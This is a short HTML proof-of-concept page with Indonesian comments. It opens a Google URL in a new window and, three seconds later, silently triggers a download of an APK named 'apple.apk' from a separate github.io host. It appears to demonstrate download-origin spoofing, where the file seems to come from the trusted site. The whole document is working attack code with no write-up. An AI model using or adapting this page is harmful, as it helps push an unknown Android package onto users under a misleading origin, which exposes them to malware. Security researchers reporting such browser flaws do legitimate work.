<!DOCTYPE html>
<html>
<head>
    <title>PoC dengan Auto-Download</title>
</head>
<body>

<h2>Click the button to open a link and auto-download file</h2>

<!-- Tombol untuk memicu proses -->
<button onclick="go()">Open Link & Download File</button>

<script>
function go() {
    // Membuka jendela baru dengan URL eksternal
    var x = window.open('https://www.google.com/csi');

    // Setelah 3 detik, file akan mulai diunduh
    setTimeout(function () {
        try {
            // Membuat elemen <a> untuk memulai download
            var link = document.createElement('a');
            link.href = 'https://ecdnts-del.github.io/test-apk/apple.apk'; // Ganti dengan URL file yang aman
            link.download = 'apple.apk'; // Nama file yang akan diunduh
            link.click(); // Memicu download otomatis
        } catch (e) {
            console.error('Error during auto-download: ', e);
        }
    }, 3000); // Waktu tunggu sebelum download dimulai (3 detik)
}
</script>

</body>
</html>
